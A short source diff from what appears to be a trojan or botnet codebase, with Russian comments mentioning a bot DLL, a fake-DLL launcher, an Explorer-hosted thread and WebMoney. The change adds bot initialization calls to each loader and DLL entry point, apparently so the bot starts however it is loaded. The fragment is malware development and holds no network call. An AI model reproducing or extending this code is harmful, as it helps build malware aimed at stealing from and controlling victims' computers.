@@ -63,9 +63,10 @@ DWORD dwWebMoneySelf = 0;
 
 DWORD WINAPI LoaderRoutine(LPVOID Data)
 {
+	BOT::Initialize();
+
 	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");
 
-	BOT::Initialize();
 	//UnhookDlls();
 
 	// Отключаем отображение ошибок при крахе процесса
@@ -177,6 +178,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 
 extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
 {
+	BOT::Initialize();
 	StartThread(ExplorerMain, NULL);
 }
 
@@ -188,6 +190,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 	switch (ul_reason_for_call)
 	{
 		case DLL_PROCESS_ATTACH:
+			BOT::Initialize();
 			StartThread(ExplorerMain, NULL);
 			break;
 		case DLL_THREAD_ATTACH:
@@ -213,6 +216,7 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 // Експортируемая ф-ция для запуска Bot.plug из FakeDll.
 BOOL WINAPI StartFromFakeDll()
 {
+	BOT::Initialize();
 	DLLDBG("StartFromFakeDll", "Started.");
 
 	// Смотрим на то - запущен ли бот
